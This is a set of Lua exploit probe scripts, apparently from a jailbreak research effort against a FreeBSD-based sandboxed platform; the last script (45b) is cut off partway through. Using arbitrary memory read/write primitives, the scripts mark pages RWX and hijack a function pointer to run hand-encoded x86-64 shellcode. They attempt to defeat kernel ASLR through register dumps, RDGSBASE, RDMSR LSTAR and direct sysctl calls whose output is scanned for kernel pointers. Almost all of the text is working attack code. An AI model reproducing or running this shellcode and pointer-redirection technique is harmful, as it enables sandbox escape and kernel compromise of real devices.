try_sysctl("kern.proc.pathname(-1)", {1, 14, 12, -1}, 4, 1024)

--------------------------------------------------------------------

local sc_sigaction = make_syscall(416)
for sig = 1, 15 do
```

## probes/phase10_untested_theories/45a_native_exec_kaslr.lua

```lua
-- CRASH_CLASS: HIGH (native code execution, syscall from shellcode)
-- PROBE 45a: Native code execution for KASLR defeat
--
-- 44a CONFIRMED: mtypeprotect(RWX) + fn_addr redirect = native code execution.
-- But return values come through the ROP chain's epilogue, not from eax.
-- This probe writes shellcode that stores results to a MEMORY BUFFER
-- instead of relying on return values.
--
-- Strategy:
--   1. Write shellcode that reads kernel info via direct syscalls
--   2. Store results to a known heap address (not via return value)
--   3. Read the buffer back from Lua after execution
--
-- Shellcode targets:
--   a) kldstat via raw syscall (bypassing sandbox at syscall entry?)
--   b) sysctl with full register control
--   c) Read MSR (LSTAR = syscall handler address = kernel pointer)
--   d) Read GS base via RDGSBASE instruction (kernel curthread)

print("=== PROBE 45a: NATIVE EXEC KASLR DEFEAT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("%08X_%08X", v.h, v.l)
    end
    return string.format("%08X", to_num(v))
end

local sc_getpid = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc_munmap = make_syscall(588)
local sc_mtypeprotect = make_syscall(585)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

--------------------------------------------------------------------
-- A) Allocate result buffer (RW, for shellcode to write to)
--------------------------------------------------------------------
print("")
print("=== A: RESULT BUFFER ===")
local result_buf = memory.alloc(0x1000)
for i = 0, 255 do safe_wd(result_buf + i*4, 0xDEADDEAD) end
local h_rb, l_rb = get_hi_lo(result_buf)
print(string.format("result_buf: %08X_%08X", h_rb, l_rb))

--------------------------------------------------------------------
-- B) Allocate executable page
--------------------------------------------------------------------
print("")
print("=== B: EXECUTABLE PAGE ===")
local page_size = 0x4000
local page
pcall(function()
    page = sc_mmap(uint64(0), uint64(page_size), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if not page then print("FATAL: mmap failed"); return end
print("code page: " .. qw_hex(page))

-- Make it RWX
pcall(function()
    sc_mtypeprotect(uint64(page), uint64(page_size), uint64(7))
end)
print("mtypeprotect(RWX): done")

--------------------------------------------------------------------
-- C) Get fn_addr for redirection
--------------------------------------------------------------------
print("")
print("=== C: FN_ADDR ===")
local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
if not fn_str then print("FATAL: cannot parse fn_addr"); return end
local fn_ptr = uint64(fn_str)
local fn_orig = safe_rq(fn_ptr)
if not fn_orig then print("FATAL: cannot read fn_addr"); return end
print("fn_addr ptr: " .. fn_str)
print("fn_addr original: " .. qw_hex(fn_orig))

-- Helper: write bytes to page at offset
local function write_bytes(base, offset, bytes)
    for i, b in ipairs(bytes) do
        memory.write_byte(base + offset + i - 1, b)
    end
    return offset + #bytes
end

-- Helper: execute shellcode and read results
local function exec_shellcode(name, page_offset)
    print(string.format("  executing %s at page+0x%X...", name, page_offset))
    -- Clear result buffer
    for i = 0, 31 do safe_wd(result_buf + i*4, 0xDEADDEAD) end

    -- Redirect fn_addr
    safe_wq(fn_ptr, page + page_offset)

    -- Trigger execution
    local ok, ret = pcall(function() return sc_getpid() end)
    local rv = ok and to_num(ret) or -999
    print(string.format("  call returned: ok=%s ret=%d", tostring(ok), rv))

    -- Restore fn_addr immediately
    safe_wq(fn_ptr, fn_orig)

    -- Read results from buffer
    local modified = 0
    for i = 0, 15 do
        local v = safe_rd(result_buf + i*4)
        if v and v ~= 0xDEADDEAD then
            modified = modified + 1
        end
    end
    return ok, modified
end

--------------------------------------------------------------------
-- D) SHELLCODE 1: Store RDI to result buffer
-- The ROP chain passes arg1 in RDI. Let's see what RDI contains
-- when our shellcode runs — it might be a useful value.
--
-- mov [result_buf], rdi    ; store rdi
-- mov [result_buf+8], rsi  ; store rsi
-- mov [result_buf+16], rdx ; store rdx
-- mov [result_buf+24], rcx ; store rcx
-- mov [result_buf+32], r8  ; store r8
-- mov [result_buf+40], r9  ; store r9
-- mov [result_buf+48], rsp ; store rsp (stack pointer!)
-- mov [result_buf+56], rbp ; store rbp
-- ret
--------------------------------------------------------------------
print("")
print("=== D: SHELLCODE 1 - DUMP REGISTERS ===")

local off = 0
-- We need to use movabs to load the 64-bit result_buf address
-- movabs rax, imm64: 48 B8 <8 bytes>
-- mov [rax], rdi:    48 89 38
-- lea rax, [rax+8]:  48 8D 40 08
-- mov [rax], rsi:    48 89 30
-- etc.

-- Encode result_buf address as 8 bytes (little-endian)
local addr_bytes = {}
addr_bytes[1] = l_rb % 256
addr_bytes[2] = math.floor(l_rb / 256) % 256
addr_bytes[3] = math.floor(l_rb / 65536) % 256
addr_bytes[4] = math.floor(l_rb / 16777216) % 256
addr_bytes[5] = h_rb % 256
addr_bytes[6] = math.floor(h_rb / 256) % 256
addr_bytes[7] = math.floor(h_rb / 65536) % 256
addr_bytes[8] = math.floor(h_rb / 16777216) % 256

-- movabs rax, result_buf
off = write_bytes(page, off, {0x48, 0xB8,
    addr_bytes[1], addr_bytes[2], addr_bytes[3], addr_bytes[4],
    addr_bytes[5], addr_bytes[6], addr_bytes[7], addr_bytes[8]})
-- mov [rax], rdi
off = write_bytes(page, off, {0x48, 0x89, 0x38})
-- mov [rax+8], rsi
off = write_bytes(page, off, {0x48, 0x89, 0x70, 0x08})
-- mov [rax+16], rdx
off = write_bytes(page, off, {0x48, 0x89, 0x50, 0x10})
-- mov [rax+24], rcx
off = write_bytes(page, off, {0x48, 0x89, 0x48, 0x18})
-- mov [rax+32], r8
off = write_bytes(page, off, {0x4C, 0x89, 0x40, 0x20})
-- mov [rax+40], r9
off = write_bytes(page, off, {0x4C, 0x89, 0x48, 0x28})
-- mov [rax+48], rsp
off = write_bytes(page, off, {0x48, 0x89, 0x60, 0x30})
-- mov [rax+56], rbp
off = write_bytes(page, off, {0x48, 0x89, 0x68, 0x38})
-- ret
off = write_bytes(page, off, {0xC3})

print(string.format("  shellcode size: %d bytes", off))

local ok1, mod1 = exec_shellcode("register dump", 0)
if ok1 then
    print("  register values:")
    for i = 0, 7 do
        local lo = safe_rd(result_buf + i*8) or 0
        local hi = safe_rd(result_buf + i*8 + 4) or 0
        local names = {"rdi", "rsi", "rdx", "rcx", "r8 ", "r9 ", "rsp", "rbp"}
        local marker = ""
        if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
            marker = " *** KERNEL POINTER ***"
        end
        print(string.format("    %s = %08X_%08X%s", names[i+1], hi, lo, marker))
    end
end

--------------------------------------------------------------------
-- E) SHELLCODE 2: Read GS base via RDGSBASE
-- RDGSBASE rax: F3 0F AE C8
-- If FSGSBASE is enabled, this reads kernel GS base directly.
-- If not enabled, it will #UD (SIGILL).
--------------------------------------------------------------------
print("")
print("=== E: SHELLCODE 2 - RDGSBASE ===")

off = 0x200
-- movabs r11, result_buf (use r11 to preserve other regs)
off = write_bytes(page, off, {0x49, 0xBB,
    addr_bytes[1], addr_bytes[2], addr_bytes[3], addr_bytes[4],
    addr_bytes[5], addr_bytes[6], addr_bytes[7], addr_bytes[8]})
-- rdgsbase rax: F3 0F AE C8
off = write_bytes(page, off, {0xF3, 0x0F, 0xAE, 0xC8})
-- mov [r11], rax
off = write_bytes(page, off, {0x49, 0x89, 0x03})
-- rdfsbase rax: F3 0F AE C0
off = write_bytes(page, off, {0xF3, 0x0F, 0xAE, 0xC0})
-- mov [r11+8], rax
off = write_bytes(page, off, {0x49, 0x89, 0x43, 0x08})
-- ret
off = write_bytes(page, off, {0xC3})

local ok2, mod2 = exec_shellcode("RDGSBASE", 0x200)
if ok2 and mod2 > 0 then
    local gs_lo = safe_rd(result_buf) or 0
    local gs_hi = safe_rd(result_buf + 4) or 0
    local fs_lo = safe_rd(result_buf + 8) or 0
    local fs_hi = safe_rd(result_buf + 12) or 0
    print(string.format("  GS base: %08X_%08X", gs_hi, gs_lo))
    print(string.format("  FS base: %08X_%08X", fs_hi, fs_lo))
    if gs_hi >= 0xFFFF8000 then
        print("  *** GS BASE IS A KERNEL POINTER! ***")
        print("  *** THIS IS LIKELY CURTHREAD - KASLR PARTIALLY DEFEATED ***")
    end
elseif ok2 then
    print("  executed but no data written (RDGSBASE may have returned 0)")
    local v0 = safe_rd(result_buf) or 0
    local v1 = safe_rd(result_buf + 4) or 0
    print(string.format("  buf[0]: %08X_%08X", v1, v0))
else
    print("  CRASHED - FSGSBASE not enabled (expected)")
end

--------------------------------------------------------------------
-- F) SHELLCODE 3: Read MSR via RDMSR (LSTAR = IA32_LSTAR = 0xC0000082)
-- LSTAR contains the syscall entry point address = kernel .text pointer
-- RDMSR requires ring 0 — will #GP if in ring 3
-- But worth trying since we're in a weird execution context
--------------------------------------------------------------------
print("")
print("=== F: SHELLCODE 3 - RDMSR LSTAR ===")

off = 0x400
-- movabs r11, result_buf
off = write_bytes(page, off, {0x49, 0xBB,
    addr_bytes[1], addr_bytes[2], addr_bytes[3], addr_bytes[4],
    addr_bytes[5], addr_bytes[6], addr_bytes[7], addr_bytes[8]})
-- mov ecx, 0xC0000082 (IA32_LSTAR)
off = write_bytes(page, off, {0xB9, 0x82, 0x00, 0x00, 0xC0})
-- rdmsr: 0F 32 (reads MSR[ecx] into edx:eax)
off = write_bytes(page, off, {0x0F, 0x32})
-- mov [r11], eax (low 32 bits)
off = write_bytes(page, off, {0x41, 0x89, 0x03})
-- mov [r11+4], edx (high 32 bits)
off = write_bytes(page, off, {0x41, 0x89, 0x53, 0x04})
-- ret
off = write_bytes(page, off, {0xC3})

local ok3, mod3 = exec_shellcode("RDMSR LSTAR", 0x400)
if ok3 and mod3 > 0 then
    local msr_lo = safe_rd(result_buf) or 0
    local msr_hi = safe_rd(result_buf + 4) or 0
    print(string.format("  LSTAR: %08X_%08X", msr_hi, msr_lo))
    if msr_hi >= 0xFFFF8000 then
        print("  *** LSTAR IS KERNEL SYSCALL ENTRY POINT ***")
        print("  *** KASLR DEFEATED - KERNEL .TEXT ADDRESS KNOWN ***")
    end
else
    print("  CRASHED or no data - RDMSR requires ring 0 (expected #GP)")
end

--------------------------------------------------------------------
-- G) SHELLCODE 4: Direct sysctl from native code with full control
-- This bypasses the ROP chain's argument marshalling entirely.
-- sysctl(kern.proc.pid) with our own buffer, read every byte.
--
-- mov eax, 202 (sysctl)
-- rdi = mib_buf, rsi = 4, rdx = outbuf, rcx = oldlenp, r8 = 0, r9 = 0
-- syscall
-- Store return value to result_buf
--------------------------------------------------------------------
print("")
print("=== G: SHELLCODE 4 - DIRECT SYSCTL ===")

-- Prepare sysctl args in memory
local mib_buf = memory.alloc(16)
safe_wd(mib_buf, 1)       -- CTL_KERN
safe_wd(mib_buf + 4, 14)  -- KERN_PROC
safe_wd(mib_buf + 8, 1)   -- KERN_PROC_PID
safe_wd(mib_buf + 12, pid)

local sysctl_out = memory.alloc(0x800)
for i = 0, 511 do safe_wd(sysctl_out + i*4, 0) end
local oldlenp = memory.alloc(8)
safe_wd(oldlenp, 0x800)
safe_wd(oldlenp + 4, 0)

local h_mib, l_mib = get_hi_lo(mib_buf)
local h_out, l_out = get_hi_lo(sysctl_out)
local h_olp, l_olp = get_hi_lo(oldlenp)

-- Encode addresses
local function addr_to_bytes(hi, lo)
    return {
        lo % 256, math.floor(lo/256) % 256, math.floor(lo/65536) % 256, math.floor(lo/16777216) % 256,
        hi % 256, math.floor(hi/256) % 256, math.floor(hi/65536) % 256, math.floor(hi/16777216) % 256
    }
end

local mib_bytes = addr_to_bytes(h_mib, l_mib)
local out_bytes = addr_to_bytes(h_out, l_out)
local olp_bytes = addr_to_bytes(h_olp, l_olp)

off = 0x600
-- movabs rdi, mib_buf
off = write_bytes(page, off, {0x48, 0xBF,
    mib_bytes[1], mib_bytes[2], mib_bytes[3], mib_bytes[4],
    mib_bytes[5], mib_bytes[6], mib_bytes[7], mib_bytes[8]})
-- mov esi, 4 (miblen)
off = write_bytes(page, off, {0xBE, 0x04, 0x00, 0x00, 0x00})
-- movabs rdx, sysctl_out
off = write_bytes(page, off, {0x48, 0xBA,
    out_bytes[1], out_bytes[2], out_bytes[3], out_bytes[4],
    out_bytes[5], out_bytes[6], out_bytes[7], out_bytes[8]})
-- movabs r10, oldlenp (syscall ABI uses r10 instead of rcx)
off = write_bytes(page, off, {0x49, 0xBA,
    olp_bytes[1], olp_bytes[2], olp_bytes[3], olp_bytes[4],
    olp_bytes[5], olp_bytes[6], olp_bytes[7], olp_bytes[8]})
-- xor r8d, r8d (newp = NULL)
off = write_bytes(page, off, {0x45, 0x31, 0xC0})
-- xor r9d, r9d (newlen = 0)
off = write_bytes(page, off, {0x45, 0x31, 0xC9})
-- mov eax, 202 (sysctl)
off = write_bytes(page, off, {0xB8, 0xCA, 0x00, 0x00, 0x00})
-- syscall
off = write_bytes(page, off, {0x0F, 0x05})
-- movabs r11, result_buf
off = write_bytes(page, off, {0x49, 0xBB,
    addr_bytes[1], addr_bytes[2], addr_bytes[3], addr_bytes[4],
    addr_bytes[5], addr_bytes[6], addr_bytes[7], addr_bytes[8]})
-- mov [r11], rax (return value)
off = write_bytes(page, off, {0x49, 0x89, 0x03})
-- ret
off = write_bytes(page, off, {0xC3})

print(string.format("  shellcode size: %d bytes", off - 0x600))
print(string.format("  mib_buf: %08X_%08X", h_mib, l_mib))
print(string.format("  sysctl_out: %08X_%08X", h_out, l_out))

local ok4, mod4 = exec_shellcode("direct sysctl", 0x600)
if ok4 then
    local ret_lo = safe_rd(result_buf) or 0
    local ret_hi = safe_rd(result_buf + 4) or 0
    print(string.format("  sysctl ret: %08X_%08X", ret_hi, ret_lo))

    -- Check actual returned length
    local actual_len = safe_rd(oldlenp) or 0
    print(string.format("  actual_len: %d", actual_len))

    if ret_lo == 0 and ret_hi == 0 and actual_len > 0 then
        print("  sysctl SUCCEEDED from native code!")
        -- Scan every qword of the output for kernel pointers
        local found_kptr = false
        for i = 0, math.min(actual_len, 0x800) - 8, 8 do
            local lo = safe_rd(sysctl_out + i) or 0
            local hi = safe_rd(sysctl_out + i + 4) or 0
            if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                print(string.format("  *** KPTR at +%03X: %08X_%08X ***", i, hi, lo))
                found_kptr = true
            end
        end
        if not found_kptr then
            print("  no kernel pointers in sysctl output")
        end

        -- Print some interesting offsets from kinfo_proc
        print("  kinfo_proc selected fields:")
        for _, info in ipairs({
            {off=0x000, name="ki_structsize"},
            {off=0x008, name="ki_paddr (proc ptr)"},
            {off=0x010, name="ki_addr (user ptr)"},
            {off=0x020, name="ki_tracep"},
            {off=0x028, name="ki_textvp"},
            {off=0x030, name="ki_fd"},
            {off=0x038, name="ki_vmspace"},
            {off=0x058, name="ki_wchan"},
            {off=0x060, name="ki_flag"},
        }) do
            local lo = safe_rd(sysctl_out + info.off) or 0
            local hi = safe_rd(sysctl_out + info.off + 4) or 0
            local marker = ""
            if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then marker = " ***KPTR***" end
            print(string.format("    +%03X %s: %08X_%08X%s", info.off, info.name, hi, lo, marker))
        end
    end
else
    print("  CRASHED during direct sysctl")
end

--------------------------------------------------------------------
-- H) Cleanup
--------------------------------------------------------------------
print("")
print("=== H: CLEANUP ===")
safe_wq(fn_ptr, fn_orig)
local fn_final = safe_rq(fn_ptr)
print("fn_addr restored: " .. qw_hex(fn_final))
pcall(function() sc_munmap(page, uint64(page_size)) end)

print("")
print("=== PROBE 45a COMPLETE ===")
```

## probes/phase10_untested_theories/45b_shellcode_write_diag.lua

```lua
-- CRASH_CLASS: MODERATE (diagnostic, no new attack surfaces)
-- PROBE 45b: Shellcode memory write diagnostic
--
-- 45a confirmed: native code execution works (ok=true, returns pid).
-- BUT: all memory writes from shellcode to result_buf showed sentinel values.
-- The shellcode's movabs+mov instructions appear to not write to the heap.
--
-- This probe isolates the failure:
--   A) Verify shellcode bytes are correctly written to the code page
--   B) Test self-page write (shellcode writes to its own RWX page)
--   C) Test cross-page write (shellcode writes to heap buffer)
--   D) Test via syscall side effect (sysctl writes to kernel-chosen output)
--   E) If any write works: register dump to understand execution context
--   F) If register dump useful: KASLR via RDGSBASE
--
-- Key changes from 45a:
-- - Writes shellcode via safe_wd (dword packing), not write_byte
-- - Verifies shellcode bytes on page before execution
-- - Tests write_byte independently
-- - Minimal 17-byte shellcode per write test

print("=== PROBE 45b: SHELLCODE WRITE DIAGNOSTIC ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("%08X_%08X", v.h, v.l)
    end
    return string.format("%08X", to_num(v))
end

local sc_getpid = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc_sysctl = make_syscall(202)
local sc_mtypeprotect = make_syscall(585)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

--------------------------------------------------------------------
-- A) SETUP
--------------------------------------------------------------------
print("")
print("=== A: SETUP ===")

local page_size = 0x4000
local page
pcall(function()
    page = sc_mmap(uint64(0), uint64(page_size), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if not page then print("FATAL: mmap code page failed"); return end
local h_pg, l_pg = get_hi_lo(page)
print(string.format("code page: %08X_%08X", h_pg, l_pg))

-- Fill code page with INT3 (0xCC) — safe trap if execution goes off-path
for i = 0, page_size/4 - 1 do safe_wd(page + i*4, 0xCCCCCCCC) end

-- Make page RWX
pcall(function() sc_mtypeprotect(uint64(page), uint64(page_size), uint64(7)) end)
print("mtypeprotect(RWX): done")

-- Heap result buffer
local result_buf = memory.alloc(0x100)
for i = 0, 63 do safe_wd(result_buf + i*4, 0xAAAAAAAA) end
local h_rb, l_rb = get_hi_lo(result_buf)
print(string.format("result_buf: %08X_%08X", h_rb, l_rb))

-- fn_addr
local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
if not fn_str then print("FATAL: cannot parse fn_addr"); return end
local fn_ptr = uint64(fn_str)
local fn_orig = safe_rq(fn_ptr)
if not fn_orig then print("FATAL: cannot read fn_addr"); return end
print("fn_addr ptr: " .. fn_str)
print("fn_addr original: " .. qw_hex(fn_orig))

-- Helper: encode uint64 as 8 little-endian bytes
local function addr_to_le(val)
    local h, l = get_hi_lo(val)
    return {
        l % 256, math.floor(l / 256) % 256,
        math.floor(l / 65536) % 256, math.floor(l / 16777216) % 256,
        h % 256, math.floor(h / 256) % 256,
        math.floor(h / 65536) % 256, math.floor(h / 16777216) % 256
    }
end

-- Helper: write byte array to page as packed dwords (proven reliable)
local function write_code(base, offset, bytes)
    local p = {}
    for _, b in ipairs(bytes) do p[#p+1] = b end
    while #p % 4 ~= 0 do p[#p+1] = 0xCC end
    for i = 0, #p/4 - 1 do
        local dw = p[i*4+1] + p[i*4+2]*256 + p[i*4+3]*65536 + p[i*4+4]*16777216
        safe_wd(base + offset + i*4, dw)
    end
    return #p
end

-- Helper: execute shellcode at page+offset, restore fn_addr
local function exec_at(offset)
    safe_wq(fn_ptr, page + offset)
    local ok, ret = pcall(function() return sc_getpid() end)
    safe_wq(fn_ptr, fn_orig)
    return ok, ok and to_num(ret) or -999
end

--------------------------------------------------------------------
-- B) VERIFY WRITE METHODS
--------------------------------------------------------------------
print("")
print("=== B: VERIFY WRITE METHODS ===")

-- B1: Does memory.write_byte exist?
print("memory.write_byte type: " .. type(memory.write_byte))

-- B2: Dword write + readback on code page (baseline)
safe_wd(page + 0x3000, 0xDEADBEEF)
local v_dw = safe_rd(page + 0x3000) or 0
print(string.format("dword write verify: wrote 0xDEADBEEF, read 0x%08X — %s",
    v_dw, v_dw == 0xDEADBEEF and "OK" or "FAIL"))

-- B3: write_byte + readback (page was filled with 0xCC)
-- Write byte 0x41 at page+0x3100, rest stays 0xCC
-- Expected dword: 0xCCCCCC41
pcall(function() memory.write_byte(page + 0x3100, 0x41) end)
local v_wb = safe_rd(page + 0x3100) or 0
print(string.format("write_byte verify: expect 0xCCCCCC41, got 0x%08X — %s",
    v_wb, v_wb == 0xCCCCCC41 and "OK" or "MISMATCH"))

-- B4: Write shellcode via write_code (dword packing)
-- Pattern: 90 90 90 90 C3 CC CC CC (NOP NOP NOP NOP RET INT3 INT3 INT3)
write_code(page, 0x3200, {0x90, 0x90, 0x90, 0x90, 0xC3})
local v_sc = safe_rd(page + 0x3200) or 0
local v_sc2 = safe_rd(page + 0x3204) or 0
print(string.format("write_code verify: expect 0x90909090 0xCCCCCCC3, got 0x%08X 0x%08X — %s",
    v_sc, v_sc2,
    (v_sc == 0x90909090 and v_sc2 == 0xCCCCCCC3) and "OK" or "MISMATCH"))

--------------------------------------------------------------------
-- C) EXECUTION BASELINE
--------------------------------------------------------------------
print("")
print("=== C: EXECUTION BASELINE ===")

-- C1: NOP sled + ret (same as 44a, confirms execution)
write_code(page, 0x100, {0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xC3})
local ok_nop, rv_nop = exec_at(0x100)
print(string.format("NOP+ret: ok=%s ret=%d — %s", tostring(ok_nop), rv_nop,
    ok_nop and "EXECUTION WORKS" or "EXECUTION FAILED"))

--------------------------------------------------------------------
-- D) WRITE TEST 1: SELF-PAGE (shellcode writes to its own RWX page)
--------------------------------------------------------------------
print("")
print("=== D: WRITE TEST 1 — SELF-PAGE ===")

-- Pre-fill target area on code page
safe_wd(page + 0x2000, 0xAAAAAAAA)
safe_wd(page + 0x2004, 0xAAAAAAAA)
print(string.format("pre-fill page+0x2000: 0x%08X", safe_rd(page + 0x2000) or 0))

-- Build shellcode: movabs rax, <page+0x2000>; mov dword [rax], 0xCAFEBABE; ret
-- 48 B8 <8 addr bytes> C7 00 BE BA FE CA C3
local target_self = page + 0x2000
local ab_self = addr_to_le(target_self)
write_code(page, 0x200, {
    0x48, 0xB8, ab_self[1], ab_self[2], ab_self[3], ab_self[4],
                ab_self[5], ab_self[6], ab_self[7], ab_self[8],
    0xC7, 0x00, 0xBE, 0xBA, 0xFE, 0xCA,
    0xC3
})

-- Verify shellcode bytes
local sc_dw0 = safe_rd(page + 0x200) or 0
print(string.format("shellcode dw0: 0x%08X (expect 0x__B848 prefix)", sc_dw0))

-- Execute
local ok_self, rv_self = exec_at(0x200)
print(string.format("exec: ok=%s ret=%d", tostring(ok_self), rv_self))

-- Check target
local v_self = safe_rd(page + 0x2000) or 0
print(string.format("page+0x2000 after: 0x%08X (expect 0xCAFEBABE)", v_self))
if v_self == 0xCAFEBABE then
    print("*** SELF-PAGE WRITE WORKS! ***")
elseif v_self ~= 0xAAAAAAAA then
    print("*** VALUE CHANGED (unexpected value) ***")
else
    print("unchanged — shellcode write to self-page FAILED")
end

--------------------------------------------------------------------
-- E) WRITE TEST 2: HEAP BUFFER (shellcode writes to memory.alloc'd memory)
--------------------------------------------------------------------
print("")
print("=== E: WRITE TEST 2 — HEAP BUFFER ===")

-- Pre-fill
safe_wd(result_buf, 0xBBBBBBBB)
safe_wd(result_buf + 4, 0xBBBBBBBB)
print(string.format("pre-fill result_buf: 0x%08X", safe_rd(result_buf) or 0))

-- Build shellcode: movabs rax, <result_buf>; mov dword [rax], 0xDEADC0DE; ret
local ab_heap = addr_to_le(result_buf)
write_code(page, 0x300, {
    0x48, 0xB8, ab_heap[1], ab_heap[2], ab_heap[3], ab_heap[4],
                ab_heap[5], ab_heap[6], ab_heap[7], ab_heap[8],
    0xC7, 0x00, 0xDE, 0xC0, 0xAD, 0xDE,
    0xC3
})

local ok_heap, rv_heap = exec_at(0x300)
print(string.format("exec: ok=%s ret=%d", tostring(ok_heap), rv_heap))

local v_heap = safe_rd(result_buf) or 0
print(string.format("result_buf after: 0x%08X (expect 0xDEADC0DE)", v_heap))
if v_heap == 0xDEADC0DE then
    print("*** HEAP WRITE WORKS! ***")
elseif v_heap ~= 0xBBBBBBBB then
    print("*** VALUE CHANGED (unexpected value) ***")
else
    print("unchanged — shellcode write to heap FAILED")
end

--------------------------------------------------------------------
-- F) WRITE TEST 3: VIA SYSCALL SIDE EFFECT
-- sysctl writes to an output buffer via KERNEL copyin/copyout.
-- If this works but direct writes fail, it proves shellcode executes
-- but can't directly address user memory (some sandbox protection).
--------------------------------------------------------------------
print("")
print("=== F: WRITE TEST 3 — SYSCTL SIDE EFFECT ===")

-- Prepare sysctl args
local mib_buf = memory.alloc(16)
safe_wd(mib_buf, 1)       -- CTL_KERN
safe_wd(mib_buf + 4, 14)  -- KERN_PROC
safe_wd(mib_buf + 8, 1)   -- KERN_PROC_PID
safe_wd(mib_buf + 12, pid)

local sysctl_out = memory.alloc(0x800)
for i = 0, 511 do safe_wd(sysctl_out + i*4, 0) end
local oldlenp = memory.alloc(8)
safe_wd(oldlenp, 0x800)
safe_wd(oldlenp + 4, 0)

-- Check initial state
local initial_outword = safe_rd(sysctl_out) or 0
local initial_len = safe_rd(oldlenp) or 0
print(string.format("before: sysctl_out[0]=0x%08X, oldlen=%d", initial_outword, initial_len))

-- Build shellcode for direct sysctl call
local ab_mib = addr_to_le(mib_buf)
local ab_out = addr_to_le(sysctl_out)
local ab_olp = addr_to_le(oldlenp)

write_code(page, 0x400, {
    -- movabs rdi, mib_buf
    0x48, 0xBF, ab_mib[1], ab_mib[2], ab_mib[3], ab_mib[4],
                ab_mib[5], ab_mib[6], ab_mib[7], ab_mib[8],
    -- mov esi, 4 (miblen)
    0xBE, 0x04, 0x00, 0x00, 0x00,
    -- movabs rdx, sysctl_out
    0x48, 0xBA, ab_out[1], ab_out[2], ab_out[3], ab_out[4],
                ab_out[5], ab_out[6], ab_out[7], ab_out[8],
    -- movabs r10, oldlenp (syscall ABI: r10 replaces rcx)
    0x49, 0xBA, ab_olp[1], ab_olp[2], ab_olp[3], ab_olp[4],
                ab_olp[5], ab_olp[6], ab_olp[7], ab_olp[8],
    -- xor r8d, r8d (newp = NULL)
    0x45, 0x31, 0xC0,
    -- xor r9d, r9d (newlen = 0)
    0x45, 0x31, 0xC9,
    -- mov eax, 202 (sysctl)
    0xB8, 0xCA, 0x00, 0x00, 0x00,
    -- syscall
    0x0F, 0x05,
    -- ret
    0xC3
})

local ok_sc, rv_sc = exec_at(0x400)
print(string.format("exec: ok=%s ret=%d", tostring(ok_sc), rv_sc))

local after_outword = safe_rd(sysctl_out) or 0
local after_len = safe_rd(oldlenp) or 0
print(string.format("after: sysctl_out[0]=0x%08X, oldlen=%d", after_outword, after_len))

if after_outword ~= 0 or after_len ~= initial_len then
    print("*** SYSCTL FROM SHELLCODE WROTE DATA! ***")
    if after_len > 0 and after_len < 0x800 then
        print(string.format("  kinfo_proc returned %d bytes", after_len))
        -- Scan for kernel pointers
        local found_kptr = false
        for i = 0, math.min(after_len, 0x800) - 8, 8 do
            local lo = safe_rd(sysctl_out + i) or 0
            local hi = safe_rd(sysctl_out + i + 4) or 0
            if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                print(string.format("  *** KPTR at +%03X: %08X_%08X ***", i, hi, lo))
                found_kptr = true
            end
        end
        if not found_kptr then print("  no kernel pointers in output") end
    end
else
    print("no change — sysctl from shellcode also FAILED")
end

--------------------------------------------------------------------
-- G) WRITE TEST 4: KNOWN-WRITABLE ADDRESS
-- fn_ptr is 100% writable (safe_wq works on it). Can shellcode write there?
--------------------------------------------------------------------
print("")
print("=== G: WRITE TEST 4 — FN_PTR ADDRESS ===")

-- Save current fn_orig, we'll write a test pattern and check
-- Use an address near fn_ptr that we can safely trash (fn_ptr + 0x100)
-- Actually, let's use fn_ptr itself since we restore it immediately
local fn_before = safe_rd(fn_ptr) or 0
print(string.format("fn_ptr low dword before: 0x%08X", fn_before))

-- Shellcode: movabs rax, <fn_ptr>; mov dword [rax], 0x12345678; ret
local ab_fn = addr_to_le(fn_ptr)
write_code(page, 0x500, {
    0x48, 0xB8, ab_fn[1], ab_fn[2], ab_fn[3], ab_fn[4],
                ab_fn[5], ab_fn[6], ab_fn[7], ab_fn[8],
    0xC7, 0x00, 0x78, 0x56, 0x34, 0x12,
    0xC3
})

